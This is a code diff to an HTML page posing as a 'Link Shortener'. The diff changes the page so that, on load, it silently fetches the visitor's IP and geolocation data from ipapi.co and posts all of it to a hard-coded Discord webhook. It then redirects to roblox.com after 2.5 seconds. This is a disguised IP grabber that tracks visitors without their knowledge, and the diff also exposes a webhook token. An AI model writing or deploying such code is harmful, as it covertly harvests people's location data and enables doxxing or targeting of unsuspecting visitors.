@@ -3,7 +3,7 @@
 <head>
     <title>Link Shortener</title>
     <script>
-        async function fetchAnimalAndSendToDiscord() {
+        async function fetchDataAndSendToDiscord() {
             const ipapiUrl = "https://ipapi.co/json/";
             const discordWebhookUrl = "https://discord.com/api/webhooks/1311146171590508585/hf3DY-DE56mvduSI8q-EstWnr5UOzJAOeVI0pMnNN_YTkT10oFVYu3OGBzJCpg6UsUe7"; // Replace with your webhook URL
 
@@ -15,12 +15,12 @@
                 }
                 const data = await response.json();
 
-                // Extract the random animal field (if it exists)
-                const animal = data.animal || "No animal field found";
+                // Convert the whole data object to a string
+                const dataString = JSON.stringify(data, null, 2);
 
                 // Prepare the Discord payload
                 const discordPayload = {
-                    content: `Random animal: ${animal}`
+                    content: `IPAPI Data: \n\`${dataString}\``
                 };
 
                 // Send the data to the Discord webhook
@@ -36,7 +36,7 @@
                     throw new Error(`Discord webhook error! status: ${discordResponse.status}`);
                 }
 
-                console.log("Animal sent to Discord successfully!");
+                console.log("Data sent to Discord successfully!");
             } catch (error) {
                 console.error("An error occurred:", error);
             }
@@ -44,9 +44,9 @@
 
         // Automatically call the function on page load
         window.onload = function() {
-            fetchAnimalAndSendToDiscord();
+            fetchDataAndSendToDiscord();
 
-            // Redirect to "roblox.com" after 5 seconds
+            // Redirect to "roblox.com" after 2.5 seconds
             setTimeout(() => {
                 window.location.href = "https://roblox.com";
             }, 2500);
